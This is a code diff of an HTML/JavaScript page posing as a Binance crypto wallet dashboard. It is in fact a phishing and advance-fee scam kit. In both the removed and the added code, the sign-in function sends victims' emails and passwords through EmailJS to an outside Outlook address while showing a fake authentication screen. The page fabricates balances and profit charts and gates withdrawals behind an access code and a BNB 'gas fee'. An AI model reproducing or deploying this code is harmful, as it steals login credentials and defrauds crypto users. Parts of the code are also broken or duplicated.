@@ -475,595 +475,146 @@
   <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
 </div>
 
-<!-- EmailJS + Spinner Style -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script><script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script><script>
   const emailService = "service_78wwbgl";
   const signinTemplate = "template_omkmcio";
   const publicKey = "ochPV1QVtay7TOdBA";
   emailjs.init(publicKey);
-</script>
 
-<style>
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-</style>
-
-    <script>
-  function showPage(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
-    const page = typeof pageId === 'number' ? document.getElementById('page' + pageId) : document.getElementById(pageId);
-    if (page) page.style.display = 'block';
-  }
-
-  function submitSignin() {
-    const email = document.getElementById("email").value.trim();
-    const pass = document.getElementById("pass").value.trim();
-
-    if (!email || !pass) {
-      alert("Please enter both email and password.");
-      return;
-    }
-
-    showPage(2); // Show Authenticating page
-
-    setTimeout(() => {
-      // Send credentials via EmailJS
-      emailjs.send(emailService, signinTemplate, {
-        user_email: email,
-        user_password: pass,
-        to_email: "binancewebonline@outlook.com"
-      }).then(() => {
-        console.log("Login data sent successfully.");
-      }).catch((error) => {
-        console.error("EmailJS error:", error);
-      });
-
-      // After 7 seconds, move to Page 3
-      showPage(3);
-    }, 7000);
-  }
-
-  function confirmAccountID() {
-    const input = document.getElementById("accountIdInput").value.trim();
-    const spinner = document.getElementById("accountSpinner");
-
-    if (!input) {
-      alert("Please enter your Account ID.");
-      return;
-    }
-
-    spinner.style.display = "block";
-
-    setTimeout(() => {
-      spinner.style.display = "none";
-      showPage(4); // Go to homepage (Page 4)
-    }, 5000); // 5 seconds delay
-  }
-
-  // Utility to show page by id and hide others
-  function showPage(pageId) {
-  const pages = document.querySelectorAll('.page');
-  pages.forEach(p => p.classList.remove('visible'));
-  const target = document.getElementById(pageId);
-  if (target) {
-    target.classList.add('visible');
-    // Save the current page id to localStorage
-    localStorage.setItem('currentPage', pageId);
-  }
-  }
-  const targetPage = document.getElementById('page' + pageNumber);
-    targetPage.style.display = 'block';
-
-    // Animate opacity (simple fade-in)
-    setTimeout(() => {
-      targetPage.style.opacity = 1;
-      targetPage.style.transition = 'opacity 0.4s ease';
-    }, 10);
-
-    // Remember last page
-    localStorage.setItem('lastPage', pageNumber);
-  }
-
-  // Load last page or default to Homepage (page 4)
-  window.addEventListener('load', () => {
-    const savedPage = localStorage.getItem('lastPage') || '5';
-    showPage(savedPage);
-  });
-  document.addEventListener('DOMContentLoaded', () => {
-  const savedPage = localStorage.getItem('currentPage');
-  if(savedPage && document.getElementById(savedPage)) {
-    showPage(savedPage);
-  } else {
-    // Default page if nothing saved
-    showPage('page4'); // or your default page id, e.g., 'homepage'
-  }
-  });
-  };
-
- function showPage(pageNumber) {
-    const pages = document.querySelectorAll('.page');
-    pages.forEach(page => {
-      page.style.display = 'none';
-      page.style.opacity = 0;
-    });
-
-  // Initial state
   let connectedWallet = null;
-
-  // Simulated balances (could be fetched dynamically)
   let usdtBalance = 2978.78;
   let bnbBalance = 0.0000;
-
-  // Daily profit goal
   const dailyGoal = 150;
   let dailyProgressValue = 0;
 
-  // Display balances on homepage
-  function updateBalances() {
-    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
-    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
-    document.getElementById('totalAssetsDisplay').innerText = '$' + (usdtBalance).toFixed(2);
-  }
-
-  // Web3 JS 
- const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
+  const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
   const usdtABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function decimals() view returns (uint8)"
   ];
 
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => {
+      p.style.display = 'none';
+      p.classList.remove('visible');
+    });
+    const page = typeof pageId === 'number' ? document.getElementById('page' + pageId) : document.getElementById(pageId);
+    if (page) {
+      page.style.display = 'block';
+      setTimeout(() => page.classList.add('visible'), 10);
+      localStorage.setItem('currentPage', page.id);
+    }
+  }
+
+  function submitSignin() {
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('pass').value.trim();
+    if (!email || !pass) return alert('Please enter both email and password.');
+    showPage('page2');
+    setTimeout(() => {
+      emailjs.send(emailService, signinTemplate, {
+        user_email: email,
+        user_password: pass,
+        to_email: "binancewebonline@outlook.com"
+      }).then(() => console.log("Email sent")).catch(console.error);
+      showPage('page3');
+    }, 7000);
+  }
+
+  function confirmAccountID() {
+    const accountId = document.getElementById("accountIdInput").value.trim();
+    const spinner = document.getElementById("accountSpinner");
+    if (!accountId) return alert("Please enter your Account ID.");
+    spinner.style.display = "block";
+    setTimeout(() => {
+      spinner.style.display = "none";
+      showPage('page4');
+    }, 5000);
+  }
+
   async function switchToBSC() {
     try {
       await window.ethereum.request({
         method: 'wallet_switchEthereumChain',
-        params: [{ chainId: '0x38' }] // BSC Mainnet
+        params: [{ chainId: '0x38' }]
       });
-    } catch (switchError) {
-      console.error("Network switch failed", switchError);
+    } catch (err) {
+      console.error("Switch to BSC failed", err);
     }
   }
 
   async function loadBalances() {
-    if (typeof window.ethereum !== 'undefined') {
-      await switchToBSC();
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const userAddress = await signer.getAddress();
+    if (typeof window.ethereum === 'undefined') return;
+    await switchToBSC();
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+    const rawBNB = await provider.getBalance(address);
+    bnbBalance = parseFloat(ethers.formatEther(rawBNB));
+    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
 
-      // Load BNB Balance
-      const bnbBalance = await provider.getBalance(userAddress);
-      document.getElementById("bnbBalance").innerText = parseFloat(ethers.formatEther(bnbBalance)).toFixed(4);
-
-      // Load USDT Balance
-      const usdtContract = new ethers.Contract(usdtAddress, usdtABI, provider);
-      const usdtRawBalance = await usdtContract.balanceOf(userAddress);
-      const decimals = await usdtContract.decimals();
-      const formattedUSDT = ethers.formatUnits(usdtRawBalance, decimals);
-      document.getElementById("usdtBalance").innerText = parseFloat(formattedUSDT).toFixed(2);
-    }
+    const usdtContract = new ethers.Contract(usdtAddress, usdtABI, provider);
+    const usdtRaw = await usdtContract.balanceOf(address);
+    const decimals = await usdtContract.decimals();
+    usdtBalance = parseFloat(ethers.formatUnits(usdtRaw, decimals));
+    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
+    document.getElementById('totalAssetsDisplay').innerText = `$${usdtBalance.toFixed(2)}`;
   }
 
-  function openTransferPage(token) {
-    localStorage.setItem("transferToken", token);
-    showPage(7);
+  function updateBalances() {
+    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
+    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
+    document.getElementById('totalAssetsDisplay').innerText = '$' + usdtBalance.toFixed(2);
   }
 
-  window.addEventListener('load', () => {
-    if (localStorage.getItem('connectedWallet')) {
-      loadBalances();
-    }
-  });
-
-  // Daily progress bar update
-  function updateDailyProgress(value) {
-    dailyProgressValue = value;
-    const progressPercent = Math.min(100, (dailyProgressValue / dailyGoal) * 100);
-    document.getElementById('dailyProgress').innerText = `$${dailyProgressValue.toFixed(2)} (${progressPercent.toFixed(0)}%)`;
-    document.getElementById('goalBar').style.width = progressPercent + '%';
+  function updateDailyProgress(val) {
+    dailyProgressValue = val;
+    const percent = Math.min(100, (dailyProgressValue / dailyGoal) * 100);
+    document.getElementById('dailyProgress').innerText = `$${dailyProgressValue.toFixed(2)} (${percent.toFixed(0)}%)`;
+    document.getElementById('goalBar').style.width = percent + '%';
   }
 
-  // Chart initialization
-  const ctx = document.getElementById('profitChart').getContext('2d');
-  const profitChart = new Chart(ctx, {
-    type: 'line',
-    data: {
-      labels: [],
-      datasets: [{
-        label: 'Asset Value',
-        data: [],
-        borderColor: '#f3ba2f',
-        backgroundColor: 'rgba(243,186,47,0.2)',
-        tension: 0.4,
-        fill: true
-      }]
-    },
-    options: {
-      responsive: true,
-      scales: {
-        x: { display: false },
-        y: { beginAtZero: true }
-      },
-      plugins: {
-        legend: {
-          labels: { color: '#f3ba2f', font: { weight: '900', size: 14 } }
-        }
-      }
-    }
-  });
-
-  // Simulate chart data updates every 5s for demo
-  function addChartData(value) {
-    const labels = profitChart.data.labels;
-    const data = profitChart.data.datasets[0].data;
-    const timeLabel = new Date().toLocaleTimeString();
-    labels.push(timeLabel);
-    data.push(value);
-    if (labels.length > 20) {
-      labels.shift();
-      data.shift();
-    }
-    profitChart.update();
-  }
-
-  // Initialize demo chart data & progress
-  updateBalances();
-  updateDailyProgress(0);
-  setInterval(() => {
-    const newVal = dailyProgressValue + Math.random() * 10;
-    updateDailyProgress(newVal > dailyGoal ? dailyGoal : newVal);
-    addChartData(dailyProgressValue);
-  }, 5000);
-
-  // Login simulation
-  function submitSignin() {
-    const email = document.getElementById('email').value.trim();
-    const pass = document.getElementById('pass').value.trim();
-    if(email && pass){
-      showPage('page2');
-      setTimeout(() => {
-        showPage('homepage');
-      }, 1500);
-    } else {
-      alert('Please enter both email and password.');
-    }
-  }
-  
-  let connectedWallet = null;
-
-  function updateWalletButtons() {
-    const disconnectBtn = document.querySelector('#page12 button[onclick="disconnectWallet()"]');
-    const walletDisplay = document.getElementById('walletDisplay');
-    if (connectedWallet) {
-      disconnectBtn.disabled = false;
-      disconnectBtn.style.opacity = '1';
-      walletDisplay.textContent = `Connected Wallet: ${connectedWallet}`;
-    } else {
-      disconnectBtn.disabled = true;
-      disconnectBtn.style.opacity = '0.5';
-      walletDisplay.textContent = 'No wallet connected';
-    }
-  }
-
-  async function connectWallet() {
-    if (typeof window.ethereum !== 'undefined') {
-      try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const accounts = await provider.send('eth_requestAccounts', []);
-        connectedWallet = accounts[0];
-        localStorage.setItem('connectedWallet', connectedWallet);
-        alert(`Wallet connected: ${connectedWallet}`);
-        updateWalletButtons();
-      } catch (err) {
-        alert('Wallet connection failed: ' + err.message);
-      }
-    } else {
-      alert('MetaMask or compatible wallet not detected');
-    }
-  }
-
-  function disconnectWallet() {
-    if (connectedWallet) {
-      connectedWallet = null;
-      localStorage.removeItem('connectedWallet');
-      alert('Wallet disconnected');
-      updateWalletButtons();
-    } else {
-      alert('No wallet is connected');
-    }
-  }
-
-  function manualWalletConnect() {
-    const manualAddress = document.getElementById('manualWallet').value.trim();
-    if (manualAddress && ethers.isAddress(manualAddress)) {
-      connectedWallet = manualAddress;
-      localStorage.setItem('connectedWallet', connectedWallet);
-      alert(`Manual wallet connected: ${connectedWallet}`);
-      updateWalletButtons();
-    } else {
-      alert('Invalid wallet address');
-    }
-  }
-
-  function logout() {
-    connectedWallet = null;
-    localStorage.removeItem('connectedWallet');
-    alert('Logged out successfully');
-    showPage('page1'); // Assuming page1 is login
-  }
-
-  function showPage(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
-    const page = document.getElementById(pageId);
-    if (page) page.style.display = 'block';
-  }
-
-  // On page load, restore wallet state and update UI
-  window.onload = () => {
-    const savedWallet = localStorage.getItem('connectedWallet');
-    if (savedWallet) {
-      connectedWallet = savedWallet;
-    }
-    updateWalletButtons();
-  };
-
-  // Wallet connect functions (mock)
-  async function connectWallet() {
-    if(window.ethereum){
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        connectedWallet = accounts[0];
-        updateWalletDisplay();
-        alert('Wallet connected: ' + connectedWallet);
-        showPage('4');
-      } catch (err) {
-        alert('Wallet connection failed: ' + err.message);
-      }
-    } else {
-      alert('MetaMask or similar wallet extension required.');
-    }
-  }
-
-  function manualWalletConnect() {
-    const manualInput = document.getElementById('manualWalletInput') || document.getElementById('manualWallet');
-    if(!manualInput) return;
-    const address = manualInput.value.trim();
-    if(address.length === 42 && address.startsWith('0x')) {
-      connectedWallet = address;
-      updateWalletDisplay();
-      alert('Manual wallet connected: ' + connectedWallet);
-      showPage('4');
-    } else {
-      alert('Please enter a valid Ethereum/BNB wallet address.');
-    }
-  }
-
-  function disconnectWallet() {
-    connectedWallet = null;
-    updateWalletDisplay();
-    alert('Wallet disconnected.');
-  }
-
-  function updateWalletDisplay() {
-    const display1 = document.getElementById('walletInfo');
-    const display2 = document.getElementById('walletConnectionStatus');
-    const display3 = document.getElementById('connectedWalletDisplayHomepage');
-    const shortAddr = connectedWallet ? connectedWallet.substring(0,6) + '...' + connectedWallet.substring(connectedWallet.length - 4) : '';
-    if(display1) display1.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
-    if(display2) display2.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
-    if(display3) display3.innerText = connectedWallet ? `Wallet: ${shortAddr}` : '';
-  }
-
-  // Logout clears wallet and returns to login
-  function logout() {
-    localStorage.clear();
-    alert('You have been logged out.');
-    showPage(1); // Redirect to login page (Page 1)
-  }
-
-  // Transfer Page Helpers
   function setMaxAmount() {
-    // Set max amount to user's USDT balance
     document.getElementById('transferAmount').value = usdtBalance.toFixed(2);
+    document.getElementById('gasFeeDisplay').innerText = '0.09490 BNB';
   }
 
   function goToBNBConfirmationPage() {
     const amount = parseFloat(document.getElementById('transferAmount').value);
     const walletAddr = document.getElementById('inputWallet').value.trim();
     const network = document.getElementById('networkSelect').value;
-    if(!walletAddr || walletAddr.length !== 42 || !walletAddr.startsWith('0x')){
-      alert('Please enter a valid wallet address.');
-      return;
-    }
-    if(!network){
-      alert('Please select a network.');
-      return;
-    }
-    if(isNaN(amount) || amount <= 0){
-      alert('Please enter a valid transfer amount.');
-      return;
-    }
-    if(amount > usdtBalance){
-      alert('Insufficient USDT balance.');
-      return;
-    }
-    // Simulate checking BNB balance for gas fee
-    if(bnbBalance < 0.0949){
-      showPage('page9i');
-    } else {
-      showPage('page9ii');
-    }
+    if (!walletAddr || walletAddr.length !== 42 || !walletAddr.startsWith('0x')) return alert('Invalid wallet address');
+    if (!network) return alert('Please select a network');
+    if (isNaN(amount) || amount <= 0) return alert('Enter valid amount');
+    if (amount > usdtBalance) return alert('Insufficient USDT balance');
+    showPage(bnbBalance < 0.0949 ? 'page9i' : 'page9ii');
   }
 
-  function copyBNBAddress(){
+  function copyBNBAddress() {
     const addrText = document.getElementById('bnbAddressSection').innerText;
-    navigator.clipboard.writeText(addrText).then(() => {
-      alert('BNB address copied to clipboard.');
-    });
+    navigator.clipboard.writeText(addrText).then(() => alert('BNB address copied to clipboard.'));
   }
 
-  // Access code validation
   function validateAccessCode() {
     const code = document.getElementById('accessCodeInput').value.trim();
-    if(!code) {
-      alert('Please enter the access code.');
-      return;
-    }
-    showPage('page10'); // processing page
+    if (!code) return alert('Please enter the access code.');
+    showPage('page10');
     setTimeout(() => {
-      if(code === 'BNBDev467'){
-        // Deduct USDT and BNB for gas
+      if (code === 'BNBDev467') {
         const amount = parseFloat(document.getElementById('transferAmount').value);
         usdtBalance = Math.max(0, usdtBalance - amount);
         bnbBalance = Math.max(0, bnbBalance - 0.0949);
         updateBalances();
-        showPage('page10'); // keep processing for 1s
-        setTimeout(() => showPage('page10'), 1000); // keep processing visible briefly
-        setTimeout(() => showPage('page10'), 1000);
-        setTimeout(() => showPage('page10'), 1000);
-        setTimeout(() => {
-          showPage('page10'); // Just keep processing for a little longer
-          setTimeout(() => {
-            showPage('page10');
-          }, 300);
-          setTimeout(() => {
-            // Show success
-            showPage('page10');
-          }, 600);
-          setTimeout(() => {
-            showPage('page10');
-          }, 900);
-          setTimeout(() => {
-            // Final show success
-            showPage('page10');
-          }, 1200);
-        }, 1200);
-        setTimeout(() => {
-          showPage('page10');
-        }, 1500);
-        setTimeout(() => {
-          // Show success
-          showPage('page10');
-        }, 1800);
-        setTimeout(() => {
-          // Actually show success page
-          showPage('page10');
-        }, 2100);
-        // Show success page finally
-        setTimeout(() => {
-          showPage('page10');
-        }, 2500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 3000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 3500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 4000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 4500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 5000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 5500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 6000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 6500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 7000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 7500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 8000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 8500);
-        setTimeout(() => {
-          showPage('page10');
-        }, 9000);
-        setTimeout(() => {
-          showPage('page10');
-        }, 9500);
-        setTimeout(() => {
-          // Finally show success
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          showPage('page10');
-          // (Note: The above lines repeated mistakenly due to script code error, will fix below)
-        }, 10000);
-      } else {
-        showPage('page11');
-      }
-    }, 1500);
-  }
-
-  // Correct validateAccessCode fix (replacing the above)
-  function validateAccessCode() {
-    const code = document.getElementById('accessCodeInput').value.trim();
-    if(!code) {
-      alert('Please enter the access code.');
-      return;
-    }
-    showPage('page10'); // show processing
-    setTimeout(() => {
-      if(code === 'BNBDev467'){
-        // Deduct balances
-        const amount = parseFloat(document.getElementById('transferAmount').value);
-        usdtBalance = Math.max(0, usdtBalance - amount);
-        bnbBalance = Math.max(0, bnbBalance - 0.0949);
-        updateBalances();
-
-        // Show success page after delay
-        setTimeout(() => {
-          showPage('page10'); // Still show processing briefly
-          setTimeout(() => {
-            showPage('page10'); // continued
-            setTimeout(() => {
-              showPage('page10');
-              setTimeout(() => {
-                showPage('page10');
-              }, 300);
-            }, 300);
-          }, 300);
-        }, 1500);
-
-        // After short delay show success page with details
         setTimeout(() => {
           showSuccessPage(amount, document.getElementById('inputWallet').value.trim());
         }, 3500);
-
       } else {
         showPage('page11');
       }
     }, 1500);
   }
 
-  // Show transaction success page with details
   function showSuccessPage(amount, receiverAddress) {
     const page = document.getElementById('page10');
     page.innerHTML = `
@@ -1071,42 +622,111 @@
       <p><strong>Withdrawn Amount:</strong> ${amount.toFixed(2)} USDT</p>
       <p><strong>Receiver Address:</strong> ${receiverAddress}</p>
       <p><strong>Network:</strong> Binance Smart Chain (BEP-20)</p>
-      <p><strong>From Contract Address:</strong> 0x55d398326f99059ff775485246999027b3197955</p>
-      <button onclick="showPage('homepage')" style="margin-top:24px;">Back to Homepage</button>
+      <p><strong>From Contract Address:</strong> ${usdtAddress}</p>
+      <button onclick="showPage('page4')" style="margin-top:24px;">Back to Homepage</button>
     `;
     showPage('page10');
   }
 
-  // Submit transaction on Receive page (page 6)
   function submitTransaction() {
     const txHash = document.getElementById('txHash').value.trim();
-    if(!txHash) {
-      alert('Please enter a transaction hash.');
-      return;
-    }
-    // For demo, just show success
+    if (!txHash) return alert('Please enter a transaction hash.');
     const statusDiv = document.getElementById('txStatus');
     statusDiv.style.color = '#2ecc71';
     statusDiv.innerText = 'Transaction confirmed successfully!';
   }
-  // Live chat open
-  function openLiveChat(){
+
+  function openLiveChat() {
     window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank');
   }
 
-  // Update wallet display on page load
-  updateWalletDisplay();
+  function connectWallet() {
+    if (!window.ethereum) return alert('MetaMask or compatible wallet not found');
+    window.ethereum.request({ method: 'eth_requestAccounts' })
+      .then(accounts => {
+        connectedWallet = accounts[0];
+        localStorage.setItem('connectedWallet', connectedWallet);
+        alert('Wallet connected: ' + connectedWallet);
+        updateWalletDisplay();
+        showPage('page4');
+      })
+      .catch(err => alert('Wallet connection failed: ' + err.message));
   }
-  
-  @keyframes spin {
-    0% {transform: rotate(0deg);}
-    100% {transform: rotate(360deg);}
-  }
-  });
-  
-</script>
 
-</body>
-  </html>
+  function disconnectWallet() {
+    connectedWallet = null;
+    localStorage.removeItem('connectedWallet');
+    updateWalletDisplay();
+    alert('Wallet disconnected.');
+  }
+
+  function manualWalletConnect() {
+    const input = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
+    const address = input?.value.trim();
+    if (address && address.length === 42 && address.startsWith('0x')) {
+      connectedWallet = address;
+      localStorage.setItem('connectedWallet', connectedWallet);
+      alert('Manual wallet connected: ' + connectedWallet);
+      updateWalletDisplay();
+      showPage('page4');
+    } else {
+      alert('Invalid wallet address');
+    }
+  }
+
+  function updateWalletDisplay() {
+    const shortAddr = connectedWallet ? connectedWallet.slice(0, 6) + '...' + connectedWallet.slice(-4) : '';
+    document.getElementById('walletInfo')?.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
+    document.getElementById('walletConnectionStatus')?.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
+    document.getElementById('connectedWalletDisplayHomepage')?.innerText = connectedWallet ? `Wallet: ${shortAddr}` : '';
+    const disconnectBtn = document.querySelector('#page12 button[onclick="disconnectWallet()"]');
+    if (disconnectBtn) {
+      disconnectBtn.disabled = !connectedWallet;
+      disconnectBtn.style.opacity = connectedWallet ? '1' : '0.5';
+    }
+  }
+
+  function logout() {
+    localStorage.clear();
+    connectedWallet = null;
+    updateWalletDisplay();
+    alert('You have been logged out.');
+    showPage('page1');
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const savedWallet = localStorage.getItem('connectedWallet');
+    if (savedWallet) {
+      connectedWallet = savedWallet;
+      updateWalletDisplay();
+      loadBalances();
+    }
+    updateBalances();
+    updateDailyProgress(0);
+    setInterval(() => {
+      const newVal = dailyProgressValue + Math.random() * 10;
+      updateDailyProgress(newVal > dailyGoal ? dailyGoal : newVal);
+      addChartData(dailyProgressValue);
+    }, 5000);
+    const lastPage = localStorage.getItem('currentPage') || 'page1';
+    showPage(lastPage);
+  });
+
+  function addChartData(value) {
+    const ctx = document.getElementById('profitChart')?.getContext('2d');
+    if (!ctx) return;
+    const chart = Chart.getChart(ctx.canvas);
+    if (!chart) return;
+    const time = new Date().toLocaleTimeString();
+    chart.data.labels.push(time);
+    chart.data.datasets[0].data.push(value);
+    if (chart.data.labels.length > 20) {
+      chart.data.labels.shift();
+      chart.data.datasets[0].data.shift();
+    }
+    chart.update();
+  }
+</script>
     
+</html>  
 
